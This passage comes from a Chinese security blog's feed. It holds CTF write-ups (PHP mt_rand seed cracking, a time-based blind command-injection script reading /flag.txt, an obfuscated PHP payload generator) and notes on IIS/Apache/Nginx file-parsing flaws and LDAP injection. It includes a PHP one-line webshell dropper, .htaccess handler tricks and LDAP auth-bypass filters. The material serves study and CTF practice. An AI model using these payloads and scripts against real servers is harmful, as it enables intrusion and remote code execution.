class="string">&quot;$&quot;</span> + (<span class="string">&quot;_&quot;</span> * offset)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(payload)):</span><br><span class="line"><span class="keyword">if</span> payload[i] == <span class="string">&#x27;_&#x27;</span>:</span><br><span class="line">res += <span class="string">f&quot;<span class="subst">&#123;first&#125;</span>.=&#x27;_&#x27;;&quot;</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">if</span> payload[i] == <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">res += <span class="string">f&quot;<span class="subst">&#123;first&#125;</span>.=&#x27;/&#x27;;&quot;</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">final_var = <span class="string">&quot;$&quot;</span> + (<span class="string">&quot;_&quot;</span> * (i + offset))</span><br><span class="line">res += <span class="string">f&quot;<span class="subst">&#123;first&#125;</span>.=<span class="subst">&#123;final_var&#125;</span>;&quot;</span></span><br><span class="line"><span class="keyword">return</span> [res, <span class="string">&quot;$&quot;</span> + <span class="string">&quot;_&quot;</span> * (offset)]</span><br><span class="line"></span><br><span class="line">pre = <span class="string">&quot;&#x27;&#x27;);&quot;</span></span><br><span class="line">after = <span class="string">&#x27;//&#x27;</span></span><br><span class="line"></span><br><span class="line">buff = len(<span class="string">&#x27;STRTOLOWERSHOW_SOURCE&#x27;</span>)</span><br><span class="line">flag = g(<span class="string">&quot;/FLAG&quot;</span>, buff)</span><br><span class="line"></span><br><span class="line">buff = len(<span class="string">&#x27;STRTOLOWER&#x27;</span>)</span><br><span class="line">showsource = g(<span class="string">&quot;SHOW_SOURCE&quot;</span>, buff)</span><br><span class="line"></span><br><span class="line">buff = <span class="number">0</span></span><br><span class="line">strtolower = g(<span class="string">&#x27;STRTOLOWER&#x27;</span>, buff)</span><br><span class="line"></span><br><span class="line">final = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#1.构造STRTOLOWER并存进变量a</span></span><br><span class="line">final += strtolower[<span class="number">0</span>]</span><br><span class="line">a = strtolower[<span class="number">1</span>] <span class="comment"># a = &#x27;$___&#x27; # STRTOLOWER</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#2.构造SHOW_SOURCE并存进变量b</span></span><br><span class="line">final += showsource[<span class="number">0</span>]</span><br><span class="line">b = showsource[<span class="number">1</span>] <span class="comment"># b = &#x27;$_____________&#x27; #SHOW_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#3.构造/FLAG并存进变量c</span></span><br><span class="line">final += flag[<span class="number">0</span>] + flag[<span class="number">1</span>] + <span class="string">&quot;=&#x27;/&#x27;.&quot;</span> + flag[<span class="number">1</span>] + <span class="string">&#x27;;&#x27;</span></span><br><span class="line">c = flag[<span class="number">1</span>] <span class="comment"># c = &#x27;$________________________&#x27; #/FLAG</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#声明好abc变量</span></span><br><span class="line">padding = <span class="string">f&#x27;$______________________________________________=<span class="subst">&#123;a&#125;</span>;$_______________________________________________=<span class="subst">&#123;b&#125;</span>;$________________________________________________=<span class="subst">&#123;c&#125;</span>;&#x27;</span></span><br><span class="line">final += padding</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.变量d = a(c) 则变量d为/flag</span></span><br><span class="line">d = <span class="string">&quot;$______________________________________________($________________________________________________);&quot;</span></span><br><span class="line">padding = <span class="string">&#x27;$_________________________________________________=&#x27;</span>+d</span><br><span class="line">final += padding</span><br><span class="line"></span><br><span class="line"><span class="comment">#5. b(d) 即为SHOW_SOURCE(&#x27;/flag&#x27;)</span></span><br><span class="line">final += <span class="string">&#x27;$_______________________________________________($_________________________________________________);&#x27;</span></span><br><span class="line"></span><br><span class="line">final = pre + final</span><br><span class="line">final = final + after</span><br><span class="line"></span><br><span class="line">print(final.replace(<span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;%2b&#x27;</span>))</span><br></pre></td></tr></table></figure><h2 id="ezflask">ezflask</h2><h3 id="TODO">TODO</h3><h2 id="Reference">Reference</h2><p><a href="https://www.gem-love.com/ctf/2598.html">https://www.gem-love.com/ctf/2598.html</a></p><p><a href="http://phoebe233.cn/?p=248">http://phoebe233.cn/?p=248</a></p><p><a href="https://rce.moe/2020/08/25/GeekPwn-2020-%E4%BA%91%E4%B8%8A%E6%8C%91%E6%88%98%E8%B5%9B-cosplay-writeup/">https://rce.moe/2020/08/25/GeekPwn-2020-云上挑战赛-cosplay-writeup/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DASCTF八月赛-Web-Writeup&quot;&gt;DASCTF八月赛 Web Writeup&lt;/h1&gt;
&lt;h2 id=&quot;安恒大学&quot;&gt;安恒大学&lt;/h2&gt;
&lt;h3 id=&quot;考点&quot;&gt;考点&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;渗透测试&lt;/li&gt;
&lt;li&gt;SQL报错注入&lt;/li&gt;
&lt;/
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>首届钓鱼城杯CTF比赛</title>
    <link href="http://ca0y1h.top/Web_security/ctf_writeup/22.%E9%A6%96%E5%B1%8A%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AFCTF/"/>
    <id>http://ca0y1h.top/Web_security/ctf_writeup/22.%E9%A6%96%E5%B1%8A%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AFCTF/</id>
    <published>2020-08-28T12:28:36.000Z</published>
    <updated>2020-09-06T13:04:20.962Z</updated>
    
    <content type="html"><![CDATA[<h1 id="“钓鱼城杯”国际网络安全技能大赛Writeup">“钓鱼城杯”国际网络安全技能大赛Writeup</h1><h2 id="easyseed">easyseed</h2><p>index.bak：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$lock = random(<span class="number">6</span>, <span class="string">&#x27;abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ&#x27;</span>);</span><br><span class="line">$key = random(<span class="number">16</span>, <span class="string">&#x27;1294567890abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ&#x27;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random</span>(<span class="params">$length, $chars = <span class="string">&#x27;0123456789ABC&#x27;</span></span>) </span>&#123;</span><br><span class="line">    $hash = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    $max = strlen($chars) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $length; $i++) &#123;</span><br><span class="line">        $hash .= $chars[mt_rand(<span class="number">0</span>, $max)];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $hash;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用php_mt_rand随机数种子爆破。<br>用脚本生成php_mt_rand工具的参数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">str1 = <span class="string">&#x27;abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">str2 = <span class="string">&#x27;vEUHaY&#x27;</span></span><br><span class="line">str3 = str1[::<span class="number">-1</span>]</span><br><span class="line">length = len(str2)</span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str2)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">            res += str(j) + <span class="string">&#x27; &#x27;</span> + str(j) + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;0&#x27;</span> + <span class="string">&#x27; &#x27;</span> + str(len(str1) - <span class="number">1</span>) + <span class="string">&#x27; &#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure><p>爆破seed<br><img src="https://uploader.shimo.im/f/8B6zswJk3nmcP932.png!thumbnail" alt="图片"></p><p>再生成key值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mt_srand(<span class="string">&#x27;718225&#x27;</span>);</span><br><span class="line">$lock = random(<span class="number">6</span>, <span class="string">&#x27;abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ&#x27;</span>);</span><br><span class="line">$key = random(<span class="number">16</span>, <span class="string">&#x27;1294567890abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> $lock.PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> $key;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random</span>(<span class="params">$length, $chars = <span class="string">&#x27;0123456789ABC&#x27;</span></span>) </span>&#123;</span><br><span class="line">    $hash = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    $max = strlen($chars) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $length; $i++) &#123;</span><br><span class="line">        $hash .= $chars[mt_rand(<span class="number">0</span>, $max)];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $hash;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发送payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;&#x27;&#x27;http://122.112.252.28:20001/&#x27;&#x27;&#x27;</span></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;key&#x27;</span>: <span class="string">&#x27;nRtqGR8mtd9ZOPyI&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;lock&#x27;</span>: <span class="string">&#x27;vEUHaY&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.get(url=url, cookies=cookies, headers=headers)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><h2 id="easyweb">easyweb</h2><p>抓包</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200906210414.png" alt=""></p><p>然后无回显命令执行，然后盲注一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://119.3.37.185/&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;if [ `cut -c  &#123;num1&#125; /flag.txt` = &quot;&#123;num2&#125;&quot; ];then sleep 2;fi&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">400</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;cmd&#x27;</span>:payload.format(num1=str(i),num2=chr(j))</span><br><span class="line">        &#125;</span><br><span class="line">        start_time = time()</span><br><span class="line">        requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> time()-start_time&gt;<span class="number">2</span>:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> chr(j) == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                exit()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;“钓鱼城杯”国际网络安全技能大赛Writeup&quot;&gt;“钓鱼城杯”国际网络安全技能大赛Writeup&lt;/h1&gt;
&lt;h2 id=&quot;easyseed&quot;&gt;easyseed&lt;/h2&gt;
&lt;p&gt;index.bak：&lt;/p&gt;
&lt;figure class=&quot;highlight php
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>服务器文件解析漏洞记录</title>
    <link href="http://ca0y1h.top/Web_security/basic_learning/25.%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/"/>
    <id>http://ca0y1h.top/Web_security/basic_learning/25.%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/</id>
    <published>2020-08-19T05:26:06.000Z</published>
    <updated>2020-08-19T06:27:14.529Z</updated>
    
    <content type="html"><![CDATA[<h1 id="服务器文件解析漏洞记录">服务器文件解析漏洞记录</h1><p>没有新东西，简单记录一下。</p><blockquote><p><a href="https://www.anquanke.com/post/id/166616">https://www.anquanke.com/post/id/166616</a></p></blockquote><h2 id="0x01-IIS文件解析漏洞">0x01 IIS文件解析漏洞</h2><p>使用iis5.x-6.x版本的服务器，大多为windows server 2003，网站比较古老，开发语句一般为asp；该解析漏洞也只能解析asp文件，而不能解析aspx文件。</p><h3 id="目录解析">目录解析</h3><p>形式：<a href="http://www.xxx.com/xx.asp/xx.jpg">www.xxx.com/xx.asp/xx.jpg</a></p><p>原理: 服务器默认会把.asp，.asa目录下的文件都解析成asp文件。</p><h3 id="文件解析">文件解析</h3><p>形式：<a href="http://www.xxx.com/xx.asp;.jpg">www.xxx.com/xx.asp;.jpg</a></p><p>原理：服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了。</p><h3 id="补充">补充</h3><p>IIS6.0的解析漏洞同样存在于IIS7.5版本。</p><h2 id="0x02-Apache文件解析漏洞">0x02 Apache文件解析漏洞</h2><h3 id="多后缀">多后缀</h3><p>Apache1.x和2.x 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。</p><h3 id="conf配置">conf配置</h3><p>1、如果在 Apache 的 conf 里有这样一行配置 <code>AddHandler php5-script .php</code> 这时只要文件名里包含 .php  即使文件名是 test2.php.jpg 也会以 php 来执行。</p><p>2、如果在 Apache 的 conf 里有这样一行配置 <code>AddType application/x-httpd-php .jpg</code>即使扩展名是 jpg，一样能以 php 方式执行。</p><h3 id="罕见后缀">罕见后缀</h3><p>Apache 配置文件中会有<code>.+.ph(p[345]?|t|tml)</code>此类的正则表达式，被当 php 程序执行的文件名要符合正则表达式，否则就算 Apache 把某文件当 php 程序，php 自己不认它，也是无用。</p><p>也就是说<code>php3，php4，php5，pht，phtml</code>也是可以被解析的。</p><h3 id="htaccess">.htaccess</h3><p>要想使 <code>.htaccess</code> 文件生效，需要两个条件:</p><p><strong>一是在 Apache 的配置文件中写上：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AllowOverrideAll</span><br></pre></td></tr></table></figure><p>若这样写则 <code>.htaccess</code> 不会生效：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AllowOverrideNone</span><br></pre></td></tr></table></figure><p><strong>二是 Apache 要加载 mod_Rewrite 模块。加载该模块，需要在 Apache 的配置文件中写上：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LoadModulerewrite_module&#x2F;usr&#x2F;lib&#x2F;apache2&#x2F;modules&#x2F;mod_rewrite.so</span><br></pre></td></tr></table></figure><p>若是在 Ubuntu 中，可能还需要执行命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudoa2enmod rewrite</span><br></pre></td></tr></table></figure><p>配置完后需要重启 Apache。</p><p><strong>如在 <code>.htaccess</code> 文件中写入：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddTypeapplication&#x2F;x-httpd-php xxx</span><br></pre></td></tr></table></figure><p>就成功地使该 <code>.htaccess</code> 文件所在目录及其子目录中的后缀为 .xxx 的文件被 Apache 当做 php 文件。</p><p>还有一种写法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch&quot;shell.jpg&quot;&gt;</span><br><span class="line"> SetHandlerapplication&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure><h2 id="0x03-Nginx文件解析漏洞">0x03 Nginx文件解析漏洞</h2><h3 id="PHP-CGI解析漏洞">PHP CGI解析漏洞</h3><p>漏洞原理参考：<a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200819140421.png" alt=""></p><p>所以下面两种写法都会将1.jpg当作PHP来解析</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www.xxxx.com&#x2F;UploadFiles&#x2F;image&#x2F;1.jpg&#x2F;1.php  </span><br><span class="line"></span><br><span class="line">www.xxxx.com&#x2F;UploadFiles&#x2F;image&#x2F;1.jpg&#x2F;%20\0.php</span><br></pre></td></tr></table></figure><p>另外一种手法：上传一个名字为 test.jpg，以下内容的文件:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?PHP</span> fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php eval($_POST[cmd])?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后访问 <code>test.jpg/.php</code>, 在这个目录下就会生成一句话木马 shell.php。</p><h3 id="空字节代码执行漏洞">空字节代码执行漏洞</h3><p>恶意用户发出请求<code>http://example.com/file.ext％00.php</code>就会将 <code>file.ext</code> 作为 PHP 文件解析。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;服务器文件解析漏洞记录&quot;&gt;服务器文件解析漏洞记录&lt;/h1&gt;
&lt;p&gt;没有新东西，简单记录一下。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://www.anquanke.com/post/id/166616&quot;&gt;https://www.anq
      
    
    </summary>
    
    
      <category term="Web安全" scheme="http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="基础学习" scheme="http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="Web安全学习" scheme="http://ca0y1h.top/tags/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="服务器解析漏洞" scheme="http://ca0y1h.top/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>浅谈LDAP注入攻击</title>
    <link href="http://ca0y1h.top/Web_security/basic_learning/24.%E6%B5%85%E8%B0%88LDAP%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/"/>
    <id>http://ca0y1h.top/Web_security/basic_learning/24.%E6%B5%85%E8%B0%88LDAP%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/</id>
    <published>2020-08-18T13:02:44.000Z</published>
    <updated>2020-08-18T13:05:53.816Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>文章首发于 安全客</p></blockquote><h1 id="从HTB靶机中浅谈LDAP注入攻击">从HTB靶机中浅谈LDAP注入攻击</h1><p>最近在HackTheBox上氪了金（肉疼😭），做了一些已经retired的高质量靶机，不得不说质量还是很高的。其中有一个靶机叫做<strong>CTF</strong>，难度是最高级别的insane，主要是它考察的知识点比较冷门——LDAP注入。可能很多小伙伴都没怎么听说过这个漏洞，我想主要原因还是LDAP这个协议用的比较少，而且国内CTF比赛中我也基本上没有看到有考察这个点的。在网上搜了一下，发现最近一次出现这个考点的是在<a href="https://ctftime.org/event/633">CSAW CTF Qualification Round 2018</a>比赛中，题目直接告诉你了是考LDAP注入。刚好上个星期我在星盟内部分享中，也提到了这个知识点，那么本着聊胜于无，开阔知识面的本意下（其实是偷懒？），写下这篇浅谈LDAP注入攻击的文章。</p><h2 id="0x01-LDAP介绍">0x01 LDAP介绍</h2><h3 id="什么是LDAP">什么是LDAP</h3><p>在做靶机之前，我们首先来了解一下什么是LDAP？</p><blockquote><p>以下内容部分摘自2018 blackhat <em>LDAP Injection &amp; Blind LDAP Injection</em></p></blockquote><p>LDAP(Lightweight Directory Access Protocol):轻量级目录访问协议，是一种在线目录访问协议，主要用于目录中资源的搜索和查询，是X.500的一种简便的实现。</p><p>那么转换成人话就是说，LDAP是用于访问目录服务（特别是基于X.500的目录服务）的轻量级客户端服务器协议，它通过TCP/IP传输服务运行。关键的地方就在于，<strong>数据是存储在目录中，而不是数据库中</strong>。的确，目录和数据库有很多共同之处，都能存储数据、并能在一定程度进行搜索和查询。这里就有一个问题了，目录和数据库的区别在哪？</p><p>最重要的区别就是<strong>目录适合于存放静态数据</strong>，它存储的数据无论在类型和种类较之数据库中的数据都要更为繁多，包括音频、视频、可执行文件、文本等文件，另外目录中还存在目录的递归。既然是存放不同类型的静态数据，那么目录服务在进行优化后更适宜于读访问，而非写、修改等操作。</p><p>说了这么半天，感觉还是贴一张图来的更快。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200721143738.png" alt=""></p><p>上面这张图展示了LDAP的结构。我们都知道MySQL数据库中的数据都是按记录一条条记录存在表中，而LDAP是树结构的，数据存储在叶子节点上。比如要描述上图<code>baby</code>这个节点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cn&#x3D;baby, ou&#x3D;marketing, ou&#x3D;people, dc&#x3D;mydomain, dc&#x3D;org</span><br></pre></td></tr></table></figure><h3 id="LDAP的基本概念">LDAP的基本概念</h3><p>在大概知道LDAP是做什么、长什么样之后，我们再来了解一下LDAP的一些基本概念，主要是三个专有名词：条目（Entry）、属性（Attribute）、对象类（ObjectClass）。</p><p><strong>条目</strong></p><p>条目，也叫记录项，是LDAP中最基本的颗粒，就想字典中的词条或者是数据中的记录。通常对LDAP的添加、删除、修改、搜索都是以条目为基本单位。</p><p><strong>属性</strong></p><p>每个条目都可以有很多属性（Attribute），比如常见的人都有姓名、地址、电话等属性。每个属性都有名称及对应的值，属性值可以有单个、多个，比如你有多个邮箱。</p><p>此外，LDAP为人员组织机构中常见的对象都设计了属性(比如commonName，surname)。</p><p><strong>对象类</strong></p><p>对象类是属性的集合，LDAP预想了很多人员组织机构中常见的对象，并将其封装成对象类。比如人员（person）含有姓（sn）、名（cn）、电话(telephoneNumber)、密码(userPassword)等属性，单位职工(organizationalPerson)是人员(person)的继承类，除了上述属性之外还含有职务（title）、邮政编码（postalCode）、通信地址(postalAddress)等属性。</p><p>通过对象类可以方便的定义条目类型。每个条目可以直接继承多个对象类，这样就继承了各种属性。如果2个对象类中有相同的属性，则条目继承后只会保留1个属性。对象类同时也规定了哪些属性是基本信息，即必要属性和可选属性。</p><p>是不是听起来和面向对象语言有点相似，跟Java中的Object类一样，LDAP的根对象类就叫做top。</p><p>上述就是笔者对LDAP数据结构的简单介绍了，LDAP既然主要用于搜索查询，那它是怎么查询的呢？</p><h3 id="LDAP的基本语法">LDAP的基本语法</h3><p>LDAP的语法非常简单，一看就会，再看就懂。</p><blockquote><p>以下部分内容摘自https://blog.csdn.net/leader_ww/article/details/4028672</p></blockquote><p><strong>=（等于）</strong></p><p>例如，如果希望查找属性<code>giveNname</code>值为John的所有对象，可以使用<code>(givenName=John)</code>。这会返回对应条件的所有对象。</p><p><strong>&amp;（逻辑与）</strong></p><p>例如，如果希望查找居住在 Dallas 并且<code>givenName</code>为John的所有对象，可以使用<code>(&amp;(givenName=John)(l=Dallas))</code>。</p><p>请注意，每个参数都被属于其自己的圆括号括起来。整个 LDAP 语句必须包括在一对主圆括号中。操作符 &amp; 表明，只有每个参数都为真，才会将此筛选条件应用到要查询的对象。</p><p><strong>|（逻辑或）</strong></p><p>例如，如果希望查找属性<code>givenName</code>值为Jhon或者Jack的所有对象，可以使用<code>(|(givenName=Jhon)(givenName=Jack))</code>。</p><p><strong>!（逻辑非）</strong></p><p>例如，如果需要查找<code>givenName</code>为John的对象以外的所有对象。则应使用如下语句：<code>(!givenName=John)</code></p><p><strong>*（通配符）</strong></p><p>可使用通配符表示值可以等于任何值。使用它的情况可能是：您希望查找具有职务头衔的所有对象。为此，可以使用<code>(title=*)</code>，这会返回<code>title</code>属性包含内容的所有对象。</p><p>另一个例子是：您知道某个对象的<code>givenName</code>属性的开头两个字母是“Jo”。那么，可以使用<code>(givenName=Jo*)</code>进行查找，这会返回<code>givenName</code>以<code>Jo</code>开头的所有对象。</p><p>Over~~LDAP的语法是不是很简单。</p><p>说了这么多，可能很多小伙伴还是心存疑问，已经部署成功的LDAP到底是长什么样子？</p><p>我们可以通过Google Hacking <code>intitle:”phpLDAPadmin” inurl:cmd.php</code>来检索一下，真实的运行的LDAP服务的网站，这个地方我就贴一张图示范一下，包含了上面提到的所有概念。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200721151807.png" alt=""></p><h2 id="0x02-LDAP注入攻击面">0x02 LDAP注入攻击面</h2><p>其实它的攻击手法和SQL注入的原理非常相似，在有漏洞的环境中，这些查询参数没有得到合适的过滤，因而攻击者可以注入任意恶意代码。由于比较简单，我这里就走马观花的方式来过一遍LDAP注入的不同类型。</p><blockquote><p>以下部分内容摘自https://wooyun.js.org/drops/LDAP%E6%B3%A8%E5%85%A5%E4%B8%8E%E9%98%B2%E5%BE%A1%E5%89%96%E6%9E%90.html</p></blockquote><h3 id="AND注入">AND注入</h3><p>这种情况，应用会构造由”&amp;”操作符和用户引入的的参数组成的正常查询在LDAP目录中搜索，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&amp;(parameter1&#x3D;value1)(parameter2&#x3D;value2))</span><br></pre></td></tr></table></figure><p>这里Value1和value2是在LDAP目录中搜索的值，攻击者可以注入代码，维持正确的过滤器结构但能使用查询实现他自己的目标。</p><p>比如说，为了验证客户端提供的user/password对，构造如下LDAP过滤器并发送给LDAP服务器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&amp;(USER&#x3D;Uname)(PASSWORD&#x3D;Pwd)) </span><br></pre></td></tr></table></figure><p>如果攻击者输入一个有效地用户名，如r00tgrok，然后再这个名字后面注入恰当的语句，password检查就会被绕过。</p><p>使得Uname=slisberger)(&amp;))，引入任何字符串作为Pwd值，构造如下查询并发送给服务器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&amp;(USER&#x3D; slisberger)(&amp;)(PASSWORD&#x3D;Pwd))</span><br></pre></td></tr></table></figure><h3 id="OR注入">OR注入</h3><p>这种情况，应用会构造由”|”操作符和用户引入的的参数组成的正常查询在LDAP目录中搜索，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 